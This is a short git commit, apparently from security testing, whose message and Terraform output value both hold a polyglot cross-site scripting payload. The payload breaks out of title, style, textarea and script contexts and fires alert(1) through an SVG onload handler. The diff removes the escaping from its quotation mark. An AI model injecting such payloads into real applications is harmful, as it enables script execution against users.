bcbd2a8f88d4ed39cdd1269edd1f035ce5845f49
Greg Foringer <Greg.Foringer@nccgroup.trust>
2019-07-09 09:35:11 -0700

    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

--- main.tf
+++ main.tf
@@ -8,7 +8,7 @@ resource "random_id" "random" {
 }
 
 output "payload" {
-  value = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+  value = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
 }
 
 output "random" {
